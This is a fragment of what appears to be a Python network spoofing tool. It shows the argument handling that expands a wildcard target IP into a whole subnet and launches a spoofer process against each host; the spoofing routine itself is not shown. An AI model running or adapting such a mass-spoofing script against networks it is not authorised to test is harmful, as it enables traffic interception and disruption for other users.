...
if __name__ == '__main__':
    ...
    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
                        help='IP address currently assigned to the target. Use a wildcard (*) to attack all ip addresses between 1 and 255.')
    ...
    if "*" in vars(cli_args)["targetip"]:
        ips = []
        processes = []
        dev_ip = get_ip()
        for j in range(1, 255):
            new_ip = vars(cli_args)["targetip"].replace("*", str(j))
            if dev_ip != new_ip:
                ips.append(new_ip)
        for ip in ips:
            args = vars(cli_args)
            args["targetip"] = ip
            p = Process(target=start_spoofer, args=(args,))
            p.start()
            processes.append(p)
        try:
            for p in processes:
